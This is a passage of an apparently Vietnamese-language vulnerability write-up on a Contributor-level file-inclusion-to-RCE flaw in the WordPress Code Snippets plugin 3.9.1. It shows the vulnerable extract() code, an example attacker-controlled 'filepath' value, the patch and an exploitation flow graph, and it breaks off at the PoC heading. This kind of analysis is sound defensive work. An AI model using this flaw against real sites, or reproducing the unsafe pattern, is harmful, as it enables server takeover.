Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/code-snippets/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Code Snippets&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.9.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v3.9.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function evaluate_shortcode_from_flat_file( $filepath, array $atts ): string {&#xA;    ob_start();&#xA;&#xA;    ( function( $atts ) use ( $filepath ) {&#xA;        /**&#xA;            * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet&#xA;            * authors to use custom attributes.&#xA;            *&#xA;            * @phpcs:disable WordPress.PHP.DontExtract.extract_extract&#xA;            */&#xA;        extract( $atts );&#xA;        require_once $filepath;&#xA;    } )( $atts );&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, m·ªôt &lt;strong&gt;anonymous function&lt;/strong&gt; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a v√† g·ªçi ngay l·∫≠p t·ª©c (IIFE). H√†m n√†y nh·∫≠n tham s·ªë &lt;code&gt;$atts&lt;/code&gt; (m·∫£ng c√°c attribute c·ªßa shortcode) v√† s·ª≠ d·ª•ng th√™m bi·∫øn &lt;code&gt;$filepath&lt;/code&gt; t·ª´ b√™n ngo√†i th√¥ng qua &lt;code&gt;use ($filepath)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;L·ªánh &lt;code&gt;extract($atts)&lt;/code&gt; s·∫Ω tr√≠ch xu·∫•t c√°c ph·∫ßn t·ª≠ trong m·∫£ng &lt;code&gt;$atts&lt;/code&gt; th√†nh bi·∫øn ri√™ng l·∫ª trong symbol table c·ªßa scope hi·ªán t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;V√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;color&amp;#39; =&amp;gt; &amp;#39;blue&amp;#39;, &amp;#39;size&amp;#39; =&amp;gt; &amp;#39;large&amp;#39;];&#xA;extract($atts);&#xA;// B√¢y gi·ªù c√≥ $color = &amp;#39;blue&amp;#39;, $size = &amp;#39;large&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªÅ m·∫∑t n·ªôi b·ªô, PHP qu·∫£n l√Ω bi·∫øn th√¥ng qua &lt;strong&gt;zval container&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tr√≠ch d·∫´n&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A PHP variable is stored in a container called a &amp;ldquo;zval&amp;rdquo;. A zval container contains, besides the variable&amp;rsquo;s type and value, two additional bits of information. The first is called &amp;ldquo;is_ref&amp;rdquo; and is a boolean value indicating whether or not the variable is part of a &amp;ldquo;reference set&amp;rdquo;. With this bit, PHP&amp;rsquo;s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the &amp;amp; operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called &amp;ldquo;refcount&amp;rdquo;, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi &lt;code&gt;extract()&lt;/code&gt; ch·∫°y:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M·ªói ph·∫ßn t·ª≠ trong &lt;code&gt;$atts&lt;/code&gt; ƒë∆∞·ª£c √°nh x·∫° th√†nh m·ªôt bi·∫øn m·ªõi.&lt;/li&gt;&#xA;&lt;li&gt;C√°c bi·∫øn n√†y tr·ªè ƒë·∫øn c√πng m·ªôt &lt;strong&gt;zval&lt;/strong&gt; v·ªõi gi√° tr·ªã trong m·∫£ng.&lt;/li&gt;&#xA;&lt;li&gt;ƒêi·ªÅu n√†y l√†m tƒÉng &lt;strong&gt;refcount&lt;/strong&gt; (s·ªë l∆∞·ª£ng t√™n bi·∫øn c√πng tham chi·∫øu ƒë·∫øn m·ªôt gi√° tr·ªã).&lt;/li&gt;&#xA;&lt;li&gt;Khi scope k·∫øt th√∫c, symbol table b·ªã h·ªßy, refcount gi·∫£m xu·ªëng v√† b·ªô nh·ªõ ƒë∆∞·ª£c gi·∫£i ph√≥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Xung ƒë·ªôt t√™n bi·∫øn:&lt;/strong&gt;&#xA;N·∫øu &lt;code&gt;$atts&lt;/code&gt; ch·ª©a key tr√πng v·ªõi bi·∫øn ƒë√£ t·ªìn t·∫°i trong scope (v√≠ d·ª• &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt;), th√¨ bi·∫øn ƒë√≥ s·∫Ω b·ªã ghi ƒë√®.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts = [&amp;#39;filepath&amp;#39; =&amp;gt; &amp;#39;/tmp/malicious.php&amp;#39;];&#xA;extract($atts);&#xA;require_once $filepath; // gi·ªù s·∫Ω n·∫°p file t·ª´ $atts, kh√¥ng ph·∫£i file g·ªëc&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√¢y ch√≠nh l√† nguy√™n nh√¢n g√¢y ra l·ªó h·ªïng: attacker c√≥ th·ªÉ ch√®n gi√° tr·ªã &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt; ƒë·ªÉ ƒëi·ªÅu khi·ªÉn file ƒë∆∞·ª£c &lt;code&gt;require_once&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.9.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#39; alt=&#34;Diff&#34; height=&#34;325&#34; width=&#34;1826&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong b·∫£n v√°, h√†m &lt;code&gt;extract()&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c b·ªï sung option &lt;code&gt;EXTR_SKIP&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;T√πy ch·ªçn n√†y ƒë·∫£m b·∫£o r·∫±ng n·∫øu &lt;code&gt;$atts&lt;/code&gt; c√≥ key tr√πng v·ªõi bi·∫øn ƒë√£ t·ªìn t·∫°i, bi·∫øn g·ªëc s·∫Ω kh√¥ng b·ªã ghi ƒë√®.&lt;/li&gt;&#xA;&lt;li&gt;Nh·ªù ƒë√≥, &lt;code&gt;$filepath&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn t·ª´ b√™n ngo√†i v·∫´n gi·ªØ nguy√™n gi√° tr·ªã an to√†n, lo·∫°i b·ªè nguy c∆° b·ªã thay th·∫ø b·ªüi d·ªØ li·ªáu t·ª´ &lt;code&gt;$atts&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public const CONTENT_SHORTCODE = &amp;#39;code_snippet&amp;#39;;&#xA;add_shortcode( self::CONTENT_SHORTCODE, [ $this, &amp;#39;render_content_shortcode&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi shortcode n√†y xu·∫•t hi·ªán trong n·ªôi dung c·ªßa post/page, WordPress s·∫Ω g·ªçi callback &lt;code&gt;render_content_shortcode&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render_content_shortcode( array $atts ): string {&#xA;    $atts = $this-&amp;gt;convert_boolean_attribute_flags( $atts, [ &amp;#39;network&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;format&amp;#39;, &amp;#39;shortcodes&amp;#39;, &amp;#39;debug&amp;#39; ] );&#xA;    $original_atts = $atts;&#xA;&#xA;    $atts = shortcode_atts(&#xA;        [&#xA;            &amp;#39;id&amp;#39;         =&amp;gt; 0,&#xA;            &amp;#39;snippet_id&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;network&amp;#39;    =&amp;gt; false,&#xA;            &amp;#39;php&amp;#39;        =&amp;gt; false,&#xA;            &amp;#39;format&amp;#39;     =&amp;gt; false,&#xA;            &amp;#39;shortcodes&amp;#39; =&amp;gt; false,&#xA;            &amp;#39;debug&amp;#39;      =&amp;gt; false,&#xA;        ],&#xA;        $atts,&#xA;        self::CONTENT_SHORTCODE&#xA;    );&#xA;&#xA;    $id = 0 !== intval( $atts[&amp;#39;snippet_id&amp;#39;] ) ? intval( $atts[&amp;#39;snippet_id&amp;#39;] ) : intval( $atts[&amp;#39;id&amp;#39;] );&#xA;    if ( ! $id ) {&#xA;        return $this-&amp;gt;invalid_id_warning( $id );&#xA;    }&#xA;&#xA;    $snippet = $this-&amp;gt;get_snippet( $id, (bool) $atts[&amp;#39;network&amp;#39;], &amp;#39;html&amp;#39; );&#xA;&#xA;    // Render the source code if this is not a shortcode snippet.&#xA;    if ( &amp;#39;content&amp;#39; !== $snippet-&amp;gt;scope ) {&#xA;        return $snippet-&amp;gt;id ? $this-&amp;gt;render_snippet_source( $snippet ) : $this-&amp;gt;invalid_id_warning( $snippet-&amp;gt;id );&#xA;    }&#xA;    ...&#xA;    $content = $this-&amp;gt;evaluate_shortcode_content( $snippet, $original_atts );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m t·∫°o ra m·ªôt ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;Snippet&lt;/strong&gt; b·∫±ng c√°ch g·ªçi ph∆∞∆°ng th·ª©c &lt;code&gt;get_snippet&lt;/code&gt;. Ph∆∞∆°ng th·ª©c nh·∫≠n v√†o ba tham s·ªë: ID c·ªßa snippet, gi√° tr·ªã boolean cho bi·∫øt c√≥ s·ª≠ d·ª•ng ch·∫ø ƒë·ªô &lt;strong&gt;network&lt;/strong&gt; hay kh√¥ng, v√† ƒë·ªãnh d·∫°ng mong mu·ªën (&lt;strong&gt;html&lt;/strong&gt;). K·∫øt qu·∫£ tr·∫£ v·ªÅ l√† m·ªôt ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;Snippet&lt;/strong&gt; ch·ª©a to√†n b·ªô th√¥ng tin c·∫ßn thi·∫øt ƒë·ªÉ ti·∫øp t·ª•c x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;p&gt;Ti·∫øp theo, h√†m ki·ªÉm tra ph·∫°m vi (&lt;strong&gt;scope&lt;/strong&gt;) c·ªßa snippet. N·∫øu snippet &lt;strong&gt;kh√¥ng&lt;/strong&gt; thu·ªôc lo·∫°i &lt;strong&gt;content&lt;/strong&gt; (&lt;code&gt;html&lt;/code&gt;)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#34; title=&#34;Content khi t·∫°o Snippet&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Content khi t·∫°o Snippet&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/content.png&#39; alt=&#34;Content&#34; height=&#34;549&#34; width=&#34;1036&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content khi t·∫°o Snippet&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;plugin s·∫Ω kh√¥ng x·ª≠ l√Ω n·ªôi dung m√† thay v√†o ƒë√≥ tr·∫£ v·ªÅ ph·∫ßn m√£ ngu·ªìn c·ªßa snippet.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;evaluate_shortcode_content()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω n·ªôi dung shortcode:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function evaluate_shortcode_content( Snippet $snippet, array $atts ): string {&#xA;    if ( empty( $atts[&amp;#39;php&amp;#39;] ) ) {&#xA;        return $snippet-&amp;gt;code;&#xA;    }&#xA;&#xA;    if ( ! Snippet_Files::is_active() ) {&#xA;        return $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;    }&#xA;&#xA;    $network = DB::validate_network_param( $snippet-&amp;gt;network );&#xA;    $table_name = Snippet_Files::get_hashed_table_name( code_snippets()-&amp;gt;db-&amp;gt;get_table_name( $network ) );&#xA;    $filepath = $this-&amp;gt;build_snippet_flat_file_path( $table_name, $snippet );&#xA;&#xA;    return file_exists( $filepath )&#xA;        ? $this-&amp;gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&#xA;        : $this-&amp;gt;evaluate_shortcode_from_db( $snippet, $atts );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m ki·ªÉm tra xem thu·ªôc t√≠nh &lt;code&gt;php&lt;/code&gt; c√≥ t·ªìn t·∫°i hay kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ m√£ ngu·ªìn g·ªëc c·ªßa snippet m√† kh√¥ng th·ª±c thi.&#xA;N·∫øu thu·ªôc t√≠nh &lt;code&gt;php&lt;/code&gt; t·ªìn t·∫°i nh∆∞ng file l∆∞u tr·ªØ ch∆∞a t·ªìn t·∫°i, h√†m chuy·ªÉn sang ph∆∞∆°ng th·ª©c x·ª≠ l√Ω tr·ª±c ti·∫øp t·ª´ c∆° s·ªü d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;p&gt;File l∆∞u tr·ªØ ƒë∆∞·ª£c khai b√°o:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private const ENABLED_FLAG_FILE = &amp;#39;flat-files-enabled.flag&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·ªÉ h√†m kh√¥ng return ·ªü ƒë√¢y, ta ph·∫£i b·∫≠t option &lt;code&gt;Enable file-based execution&lt;/code&gt; trong admin panel:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#34; title=&#34;Enable file-based execution&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Enable file-based execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/enable.png&#39; alt=&#34;Enable&#34; height=&#34;810&#34; width=&#34;982&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Enable file-based execution&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi ƒë√≥ file l∆∞u tr·ªØ ƒë∆∞·ª£c t·∫°o n·∫±m trong &lt;code&gt;wp-content/code-snippets&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#34; title=&#34;flat-files-enabled.flag ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;flat-files-enabled.flag ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/file.png&#39; alt=&#34;File&#34; height=&#34;253&#34; width=&#34;561&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;flat-files-enabled.flag ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi file ƒë√£ t·ªìn t·∫°i, h√†m ti·∫øn h√†nh x√°c ƒë·ªãnh th√¥ng tin m·∫°ng c·ªßa snippet, l·∫•y t√™n b·∫£ng ƒë√£ ƒë∆∞·ª£c bƒÉm (hash) v√† x√¢y d·ª±ng ƒë∆∞·ªùng d·∫´n ƒë·∫øn file ch·ª©a n·ªôi dung c·ªßa snippet g√°n v√†o &lt;code&gt;$filepath&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu &lt;code&gt;$filepath&lt;/code&gt; t·ªìn t·∫°i h√†m g·ªçi ƒë·∫øn &lt;code&gt;evaluate_shortcode_from_flat_file( $filepath, $atts )&lt;/code&gt; n∆°i x·∫£y ra l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;L·ªï h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi ƒë·∫∑c quy·ªÅn Contributor v√¨ ƒë√¢y l√† ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ ch√®n shortcode v√†o post&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor inserts [code_snippet] shortcode&amp;#34;] --&amp;gt; B[&amp;#34;WordPress calls render_content_shortcode()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;convert_boolean_attribute_flags()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;shortcode_atts(): merge defaults into $atts&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Determine snippet_id ‚Üí if invalid ‚Üí invalid_id_warning()&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;get_snippet(id, network, &amp;#39;html&amp;#39;) ‚Üí create Snippet object&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;snippet.scope == &amp;#39;content&amp;#39;?&amp;#34;}&#xA;&#xA;G -- No --&amp;gt; H[&amp;#34;render_snippet_source()&amp;#34;]&#xA;H --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;&#xA;G -- Yes --&amp;gt; I[&amp;#34;evaluate_shortcode_content(snippet, original_atts)&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;original_atts[&amp;#39;php&amp;#39;] enabled?&amp;#34;}&#xA;J -- No --&amp;gt; K[&amp;#34;Return snippet-&amp;gt;code&amp;#34;] --&amp;gt; Z&#xA;&#xA;J -- Yes --&amp;gt; L{&amp;#34;Snippet_Files::is_active()?&amp;#34;}&#xA;&#xA;L -- No --&amp;gt; M[&amp;#34;evaluate_shortcode_from_db()&amp;#34;] --&amp;gt; Z&#xA;&#xA;L -- Yes --&amp;gt; N[&amp;#34;Build file path: build_snippet_flat_file_path()&amp;#34;]&#xA;N --&amp;gt; O{&amp;#34;Does file exist?&amp;#34;}&#xA;&#xA;O -- No --&amp;gt; M&#xA;&#xA;O -- Yes --&amp;gt; P[&amp;#34;evaluate_shortcode_from_flat_file(filepath, atts)&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;extract(atts) inside IIFE&amp;#34;]&#xA;Q --&amp;gt; R{&amp;#34;Do atts contain variable-name collisions (e.g., &amp;#39;filepath&amp;#39;)?&amp;#34;}&#xA;&#xA;R -- No --&amp;gt; S[&amp;#34;require_once filepath (safe)&amp;#34;] --&amp;gt; Z&#xA;&#xA;R -- Yes --&amp;gt; T[&amp;#34;Internal variable overwritten ‚Üí filepath replaced&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;require_once attacker-controlled file&amp;#34;]&#xA;U --&amp;gt; V[&amp;#34;RCE achieved&amp;#34;]&#xA;V --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a 